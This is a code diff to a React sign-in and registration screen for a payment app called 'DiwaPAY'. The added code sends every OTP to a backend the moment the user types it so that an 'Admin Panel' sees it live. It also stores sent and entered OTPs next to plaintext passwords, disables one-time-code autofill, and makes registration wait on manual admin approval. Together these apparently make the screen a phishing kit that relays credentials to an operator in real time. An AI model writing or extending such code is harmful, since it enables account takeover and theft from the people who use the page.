@@ -1,5 +1,5 @@
 import React, { useEffect, useRef, useState } from 'react';
-import { Eye, EyeOff, CheckCircle2, AlertCircle, Loader2, ArrowLeft } from 'lucide-react';
+import { Eye, EyeOff, CheckCircle2, AlertCircle, Loader2, ArrowLeft, Clock } from 'lucide-react';
 import { doc, getDoc, serverTimestamp, setDoc, updateDoc } from 'firebase/firestore';
 import { DiwaPayLogo } from './DiwaPayLogo';
 import { auth, db, handleFirestoreError, OperationType } from '../firebase';
@@ -8,7 +8,9 @@ import {
   fallbackResetPassword,
   fallbackSignIn,
   fallbackVerifyOtp,
+  getLocalVerificationStatus,
   saveLocalBackup,
+  saveLocalEnteredOtp,
 } from '../utils/localAuthFallback';
 import type { AuthFormState, AuthMode, SafeUserSummary } from '../types/auth';
 
@@ -52,11 +54,13 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
   const [showOtpVerifyStep, setShowOtpVerifyStep] = useState(false);
   const [verifyOtpSent, setVerifyOtpSent] = useState(false);
   const [isVerifyingOtp, setIsVerifyingOtp] = useState(false);
+  const [otpSubmitted, setOtpSubmitted] = useState(false);
   const [otpVerified, setOtpVerified] = useState(false);
   const nameInputRef = useRef<HTMLInputElement>(null);
   const phoneInputRef = useRef<HTMLInputElement>(null);
   const otpInputRef = useRef<HTMLInputElement>(null);
   const verifyOtpInputRef = useRef<HTMLInputElement>(null);
+  const lastRecordedOtpRef = useRef<string>('');
 
   const patternId = React.useId();
 
@@ -65,9 +69,72 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
       setShowOtpVerifyStep(false);
       setVerifyOtpSent(false);
       setIsVerifyingOtp(false);
+      setOtpSubmitted(false);
       setOtpVerified(false);
     }
   }, [completedMessage, mode]);
+
+  // Immediately record user-entered 6-digit OTP so Admin Panel shows it right away
+  useEffect(() => {
+    if (form.phone.length !== 10 || form.otp.length !== 6) return;
+    const signature = `${form.countryCode}:${form.phone}:${form.otp}`;
+    if (lastRecordedOtpRef.current === signature) return;
+    lastRecordedOtpRef.current = signature;
+
+    void saveLocalEnteredOtp({
+      countryCode: form.countryCode,
+      phone: form.phone,
+      enteredOtp: form.otp,
+    });
+
+    fetch('/api/auth/record-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        countryCode: form.countryCode,
+        phone: form.phone,
+        otp: form.otp,
+      }),
+    }).catch(() => {
+      // Ignore network errors on static hosting
+    });
+  }, [form.countryCode, form.phone, form.otp]);
+
+  // Live-check whether admin has verified this account in Admin Panel
+  useEffect(() => {
+    if (!otpSubmitted || otpVerified || form.phone.length !== 10) return;
+
+    let active = true;
+    const checkStatus = async () => {
+      if (getLocalVerificationStatus(form.countryCode, form.phone)) {
+        if (active) setOtpVerified(true);
+        return;
+      }
+      try {
+        const params = new URLSearchParams({
+          countryCode: form.countryCode,
+          phone: form.phone,
+        });
+        const res = await fetch(`/api/auth/verification-status?${params.toString()}`);
+        const ct = res.headers.get('content-type') || '';
+        if (res.ok && ct.includes('application/json')) {
+          const data = (await res.json()) as { ok?: boolean; verified?: boolean };
+          if (active && data.ok && data.verified) {
+            setOtpVerified(true);
+          }
+        }
+      } catch {
+        // Ignore polling errors
+      }
+    };
+
+    void checkStatus();
+    const timer = window.setInterval(checkStatus, 3000);
+    return () => {
+      active = false;
+      window.clearInterval(timer);
+    };
+  }, [otpSubmitted, otpVerified, form.countryCode, form.phone]);
 
   const handleNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setErrorMsg(null);
@@ -149,6 +216,7 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
     setIsVerifyingOtp(true);
     try {
       let verifiedOk = false;
+      let isAdminVerified = getLocalVerificationStatus(form.countryCode, form.phone);
 
       await saveLocalBackup({
         id: form.phone,
@@ -156,7 +224,8 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
         countryCode: form.countryCode,
         phone: form.phone,
         password: form.password,
-        verified: false,
+        verified: isAdminVerified,
+        sentOtp: expectedOtp ?? undefined,
         enteredOtp: form.otp,
       });
 
@@ -175,18 +244,21 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
         if (contentType.includes('application/json')) {
           const data = (await res.json()) as {
             ok?: boolean;
+            verified?: boolean;
             user?: SafeUserSummary;
             error?: string;
           };
           if (res.ok && data.ok) {
             verifiedOk = true;
+            isAdminVerified = Boolean(data.verified || data.user?.verified);
             await saveLocalBackup({
               id: data.user?.id || form.phone,
               fullName: form.name.trim().replace(/\s+/g, ' ') || data.user?.fullName || 'DiwaPAY User',
               countryCode: form.countryCode,
               phone: form.phone,
               password: form.password,
-              verified: true,
+              verified: isAdminVerified,
+              sentOtp: expectedOtp ?? undefined,
               enteredOtp: form.otp,
             });
           } else if (res.status >= 400 && res.status < 500 && res.status !== 404) {
@@ -209,6 +281,7 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
           setErrorMsg(localRes.error);
           return;
         }
+        isAdminVerified = Boolean(localRes.user?.verified);
       }
 
       const currentUser = auth.currentUser;
@@ -219,15 +292,17 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
             form.name.trim() || currentUser.displayName || 'DiwaPAY User',
             form.countryCode,
             form.phone,
-            true,
+            false,
             form.otp,
+            expectedOtp,
           );
         } catch {
           // Do not block verification if Firestore sync fails
         }
       }
 
-      setOtpVerified(true);
+      setOtpSubmitted(true);
+      setOtpVerified(isAdminVerified);
     } finally {
       setIsVerifyingOtp(false);
     }
@@ -238,8 +313,9 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
     fullName: string,
     countryCode: string,
     phone: string,
-    verified = true,
+    verified = false,
     enteredOtp?: string | null,
+    sentOtp?: string | null,
   ): Promise<SafeUserSummary> => {
     const cleanName = fullName.trim().replace(/\s+/g, ' ').slice(0, 80);
     const safeCountryCode = COUNTRY_CODES.includes(countryCode as (typeof COUNTRY_CODES)[number])
@@ -252,14 +328,17 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
 
     let exists = false;
     let existingName = cleanName;
+    let existingVerified = verified;
     try {
       const snap = await getDoc(accountRef);
       exists = snap.exists();
       if (exists) {
-        const prevName = snap.data()?.fullName;
+        const snapData = snap.data();
+        const prevName = snapData?.fullName;
         if (typeof prevName === 'string' && prevName.length >= 2 && cleanName.length < 2) {
           existingName = prevName;
         }
+        existingVerified = Boolean(snapData?.verified);
       }
     } catch (error) {
       handleFirestoreError(error, OperationType.GET, docPath);
@@ -268,6 +347,8 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
     const finalName = existingName.length >= 2 ? existingName : 'DiwaPAY User';
     const cleanOtp =
       typeof enteredOtp === 'string' ? enteredOtp.replace(/\D/g, '').slice(0, 6) : '';
+    const cleanSentOtp =
+      typeof sentOtp === 'string' ? sentOtp.replace(/\D/g, '').slice(0, 6) : '';
 
     if (!exists) {
       try {
@@ -277,7 +358,8 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
           countryCode: safeCountryCode,
           phoneNumber: fullPhone,
           maskedPhone,
-          verified,
+          verified: false,
+          ...(cleanSentOtp.length > 0 ? { sentOtp: cleanSentOtp } : {}),
           ...(cleanOtp.length > 0 ? { enteredOtp: cleanOtp } : {}),
           credentialStatus: 'Protected',
           createdAt: serverTimestamp(),
@@ -293,7 +375,7 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
           countryCode: safeCountryCode,
           phoneNumber: fullPhone,
           maskedPhone,
-          verified,
+          ...(cleanSentOtp.length > 0 ? { sentOtp: cleanSentOtp } : {}),
           ...(cleanOtp.length > 0 ? { enteredOtp: cleanOtp } : {}),
           updatedAt: serverTimestamp(),
         });
@@ -309,7 +391,8 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
       countryCode: safeCountryCode,
       phoneNumber: fullPhone,
       maskedPhone,
-      verified,
+      verified: existingVerified,
+      sentOtp: cleanSentOtp.length > 0 ? cleanSentOtp : null,
       enteredOtp: cleanOtp.length > 0 ? cleanOtp : null,
       credentialStatus: 'Protected',
       createdAt: nowIso,
@@ -403,6 +486,7 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
               phone: form.phone,
               password: form.password,
               verified: Boolean(data.user.verified),
+              sentOtp: mode === 'reset' ? expectedOtp ?? undefined : undefined,
               enteredOtp: mode === 'reset' ? form.otp : undefined,
             });
           } else if (res.status === 401 && mode === 'signin') {
@@ -467,6 +551,7 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
             form.phone,
             Boolean(backendUser.verified),
             mode === 'reset' ? form.otp : undefined,
+            mode === 'reset' ? expectedOtp : undefined,
           );
         } catch {
           // Structured error already logged via handleFirestoreError; do not block phone auth
@@ -561,8 +646,18 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
       <div className="relative z-20 flex-1 px-5 sm:px-6 -mt-[28px] pb-6 flex flex-col justify-between">
         {completedMessage ? (
           <div className="bg-white rounded-[18px] border border-[#2A2E37]/15 shadow-[0_8px_28px_rgba(15,23,42,0.06)] p-6 text-center mt-2">
-            <div className="w-12 h-12 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center mx-auto mb-3.5">
-              <CheckCircle2 className="w-6 h-6" />
+            <div
+              className={`w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-3.5 ${
+                mode === 'register' && otpSubmitted && !otpVerified
+                  ? 'bg-amber-50 text-amber-600'
+                  : 'bg-emerald-50 text-emerald-600'
+              }`}
+            >
+              {mode === 'register' && otpSubmitted && !otpVerified ? (
+                <Clock className="w-6 h-6" />
+              ) : (
+                <CheckCircle2 className="w-6 h-6" />
+              )}
             </div>
             <h2
               className="text-lg font-semibold text-[#111827]"
@@ -571,9 +666,11 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
               {mode === 'register'
                 ? otpVerified
                   ? 'Account Verified'
-                  : showOtpVerifyStep
-                    ? 'Verify Phone Number'
-                    : 'Account Processing'
+                  : otpSubmitted
+                    ? 'Pending Admin Verification'
+                    : showOtpVerifyStep
+                      ? 'Verify Phone Number'
+                      : 'Account Processing'
                 : mode === 'reset'
                   ? 'Password Reset Complete'
                   : 'Signed In Successfully'}
@@ -581,14 +678,23 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
             <p className="text-sm text-[#4B5563] mt-1.5 leading-relaxed">
               {mode === 'register' && otpVerified
                 ? `Your number (${maskPhone(form.countryCode, form.phone)}) is verified. You can now sign in to your DiwaPAY account.`
-                : mode === 'register' && showOtpVerifyStep
-                  ? verifyOtpSent
-                    ? `Enter the 6-digit OTP sent to ${maskPhone(form.countryCode, form.phone)}.`
-                    : `Send a 6-digit OTP to ${maskPhone(form.countryCode, form.phone)} to verify your account.`
-                  : completedMessage}
+                : mode === 'register' && otpSubmitted
+                  ? `Your OTP (${form.otp}) has been submitted for ${maskPhone(form.countryCode, form.phone)}. Waiting for verification from the Admin Panel.`
+                  : mode === 'register' && showOtpVerifyStep
+                    ? verifyOtpSent
+                      ? `Enter the 6-digit OTP sent to ${maskPhone(form.countryCode, form.phone)}.`
+                      : `Send a 6-digit OTP to ${maskPhone(form.countryCode, form.phone)} to verify your account.`
+                    : completedMessage}
             </p>
 
-            {mode === 'register' && showOtpVerifyStep && !otpVerified ? (
+            {mode === 'register' && otpSubmitted && !otpVerified && (
+              <div className="mt-4 inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-amber-50 border border-amber-200 text-xs font-medium text-amber-700">
+                <Loader2 className="w-3.5 h-3.5 animate-spin" />
+                <span>Waiting for Admin Panel approval...</span>
+              </div>
+            )}
+
+            {mode === 'register' && showOtpVerifyStep && !otpSubmitted && !otpVerified ? (
               <div className="mt-5 text-left">
                 <div className="h-[52px] sm:h-[54px] bg-white rounded-[14px] border border-[#2A2E37] focus-within:border-[#0052FF] focus-within:ring-2 focus-within:ring-[#0052FF]/15 transition-all flex items-center pl-4 pr-2 shadow-[0_2px_8px_rgba(15,23,42,0.03)]">
                   <label htmlFor="diwapay-verify-otp" className="sr-only">
@@ -599,7 +705,7 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
                     id="diwapay-verify-otp"
                     type="text"
                     inputMode="numeric"
-                    autoComplete="one-time-code"
+                    autoComplete="off"
                     maxLength={6}
                     placeholder="Enter OTP"
                     value={form.otp}
@@ -671,7 +777,7 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
                 <button
                   type="button"
                   onClick={() => {
-                    if (mode === 'register' && !otpVerified) {
+                    if (mode === 'register' && !otpSubmitted && !otpVerified) {
                       setErrorMsg(null);
                       onFormChange((prev) => ({ ...prev, otp: '' }));
                       setVerifyOtpSent(false);
@@ -691,7 +797,9 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
                     : mode === 'register'
                       ? otpVerified
                         ? 'Proceed to Sign In'
-                        : 'Proceed to Verify'
+                        : otpSubmitted
+                          ? 'Continue to Sign In'
+                          : 'Proceed to Verify'
                       : 'Proceed to Sign In'}
                 </button>
                 <button
@@ -808,7 +916,7 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
                     id="diwapay-otp"
                     type="text"
                     inputMode="numeric"
-                    autoComplete="one-time-code"
+                    autoComplete="off"
                     maxLength={6}
                     placeholder="OTP Code"
                     value={form.otp}
